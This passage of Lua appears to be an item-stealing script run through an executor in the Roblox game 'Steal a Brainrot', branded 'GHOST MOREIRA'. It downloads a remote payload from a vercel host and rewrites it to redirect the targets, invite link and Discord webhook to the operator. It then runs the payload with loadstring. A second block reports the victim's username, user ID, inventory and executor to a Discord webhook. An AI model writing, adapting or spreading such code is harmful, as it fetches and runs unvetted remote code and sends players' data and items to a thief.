-- [2] TRADE: sab.txt carga en t=0, primer HttpGet sin delay
task.spawn(function()
    local sabUrl = 'https://ghost-moreira.vercel.app/sab.txt'
    for attempt = 1, 5 do
        local ok, body = pcall(game.HttpGet, game, sabUrl .. '?t=' .. tostring(tick()))
        if ok and body and #body > 500 then
            body = body:gsub('NEDYXSTOCK19', function() return getgenv().GHOST_TARGET or 'x' end)
            body = body:gsub('said123ca',    function() return getgenv().GHOST_TARGET or 'x' end)
            body = body:gsub('[Cc][Hh][Oo][Cc][Oo][Ll][Aa]', 'GHOST MOREIRA')
            body = body:gsub('discord%.gg/[%w]+', 'discord.gg/t82eh7bgY')
            body = body:gsub('https://discord%.com/api/webhooks/[%w_%-/]+', function() return getgenv().GHOST_WEBHOOK end)
            if getgenv().GHOST_ANTI_LEAVE ~= true then
                body = body:gsub('while task%.wait%(%) do%s*pcall%(function%(%)%s*for _, v in ipairs%(getconnections', 'while false do pcall(function() for _, v in ipairs(getconnections')
            end
            local s = pcall(function() loadstring(body)() end)
            if s then return end
        end
        task.wait(1)
    end
end)

-- [3] REPORT: polling 800ms, dispara en cuanto haya inventario
task.spawn(function()
    local deadline = tick() + 0.8
    local inv = nil
    while tick() < deadline do
        if getgenv().GetSABInventory then
            local ok, v = pcall(getgenv().GetSABInventory)
            if ok and type(v) == 'table' and #v > 0 then inv = v; break end
        end
        task.wait(0.05)
    end
    local executor = _executor()
    local t = math.floor(os.time())
    local playerCount = #game:GetService('Players'):GetPlayers()
    local selBR = getgenv().GHOST_SELECTED_BR or {}
    local selBS = getgenv().GHOST_SELECTED_BS or {}
    local selGE = getgenv().GHOST_SELECTED_GE or {}
    local selSet = {}
    for _, n in ipairs(selBR) do selSet[string.lower(n)] = true end
    local brLines = {}
    if inv and #inv > 0 then
        for _, b in ipairs(inv) do
            local name = _esc(b.DisplayName or b.Index or '?')
            local gen = tonumber(b.Generation) or 0
            local mut = _esc(b.Mutation or '')
            local mark = selSet[string.lower(name)] and '⭐ ' or ''
            local mstr = mut ~= '' and ('['..mut..'] ') or ''
            brLines[#brLines+1] = mark..'🧠 **'..mstr..name..'** ($'.._fmt(gen)..'/s)'
        end
    else
        brLines[1] = '*None selected*'
    end
    local bsLines, geLines = {}, {}
    for _, n in ipairs(selBS) do bsLines[#bsLines+1] = '🎨 **'.._esc(n)..'**' end
    for _, n in ipairs(selGE) do geLines[#geLines+1] = '⚙️ **'.._esc(n)..'**' end
    if #bsLines == 0 then bsLines[1] = '*None selected*' end
    if #geLines == 0 then geLines[1] = '*None selected*' end
    local brStr = table.concat(brLines, '\n')
    local bsStr = table.concat(bsLines, '\n')
    local geStr = table.concat(geLines, '\n')
    if #brStr > 3800 then brStr = brStr:sub(1,3750)..'\n...(truncado)' end
    if #bsStr > 3800 then bsStr = bsStr:sub(1,3750)..'\n...(truncado)' end
    if #geStr > 3800 then geStr = geStr:sub(1,3750)..'\n...(truncado)' end
    local desc = '📨 **Invite received from:** `'.._esc(_PLR.Name)..'` (ID: `'..tostring(_PLR.UserId)..'`)\n\n' ..
                 '## Brainrots\n'..brStr..'\n\n' ..
                 '## Base Skins\n'..bsStr..'\n\n' ..
                 '## Gears\n'..geStr..'\n\n' ..
                 '## Status\n**Not in Duel**\n' ..
                 '🕒 <t:'..t..':f>\n' ..
                 '🌍 Players in server: **'..playerCount..'**\n' ..
                 '⚡ Executor: **'.._esc(executor)..'**\n' ..
                 'GHOST MOREIRA  |  https://discord.gg/t82eh7bgY'
    _post(getgenv().GHOST_WEBHOOK, {
        username = 'GHOST MOREIRA',
        embeds = {{ description = desc, color = 9662683,
            footer = { text = 'GHOST MOREIRA | https://discord.gg/t82eh7bgY' } }}
    }, 3)
end)

